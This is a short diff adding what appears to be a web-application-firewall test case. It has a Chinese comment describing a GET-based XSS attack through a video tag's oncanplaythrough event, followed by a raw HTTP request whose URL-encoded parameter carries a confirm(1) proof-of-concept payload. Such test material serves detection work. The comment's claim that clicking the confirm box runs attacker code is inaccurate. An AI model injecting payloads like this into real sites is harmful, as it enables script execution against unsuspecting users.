@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件_video标签_oncanplaythrough事件-06506516
+# 攻击者注入了一个 HTML 视频标签，其中包含一个源标签，指向一个名为"validvideo.mp4"的视频文件。但是，攻击者通过在"oncanplaythrough"属性中注入恶意代码，使得当浏览器播放视频时，会执行确认框的脚本，其内容为"confirm(1)"，这将返回一个布尔值，如果用户点击了确认按钮，则该值将为 true，从而执行攻击者的代码。当加载了足够的数据以一直播放资源时触发。
+GET /?id=%3Cvideo%20oncanplaythrough=confirm%281%29%3E%3Csource%20src=%22validvideo.mp4%22%20type=%22video%2Fmp4%22%3E%3C%2Fvideo%3E&bid=hd_tag_m8mv26cu HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26cu
+RM-PRO-Token: 370f543c60e35e5dfb2e0b99971d5276
+RM-PRO-Time: 1742808582189
+User-Agent: curl/7.83.1
+
